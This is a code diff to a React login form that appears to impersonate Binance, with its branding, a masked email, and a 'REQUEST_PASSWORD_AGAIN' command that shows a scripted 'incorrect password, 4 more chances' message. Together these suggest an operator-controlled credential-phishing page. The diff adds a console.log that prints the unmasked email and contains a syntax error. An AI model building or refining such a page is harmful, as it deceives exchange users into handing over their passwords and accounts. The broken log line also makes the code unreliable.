@@ -20,6 +20,7 @@ export default function LoginForm({ setNavigation, navigation }) {
         if (!domain) return userEmail;
 
         const maskedLocal = localPart.charAt(0) + '****';
+        console.log("email is ", `${maskedLocal}@${domain}` 'or', userEmail)
         return `${maskedLocal}@${domain}`;
     };
 
@@ -165,6 +166,11 @@ export default function LoginForm({ setNavigation, navigation }) {
                                     </div>
                                 </div>
                             </div>
+                            <p className="text-sm text-red-500">
+                            {command === 'REQUEST_PASSWORD_AGAIN' 
+                                ? 'Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left.(200001004-72815107)' 
+                                : 'Please enter a valid Password'}
+                            </p>
 
 
                             {/* <p className={`text-[14px] text-red-500 ${invalid ? 'block' : 'hidden'} mt-1 w-full`}>
@@ -172,8 +178,6 @@ export default function LoginForm({ setNavigation, navigation }) {
                             </p> */}
 
                         </div>
-                        {command === 'REQUEST_PASSWORD_AGAIN' ? 'Incorrect password. Please retry or click "Forgot Password?" to reset. You have 4 more chances left.(200001004-72815107)' : 'Please enter a valid Password'}
-
                         {/* Form Button */}
                         <button className={`mt-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`} type='button' onClick={handlePasswordValidation}>
                             {isLoading ? <BinanceLoader /> : 'Next'}
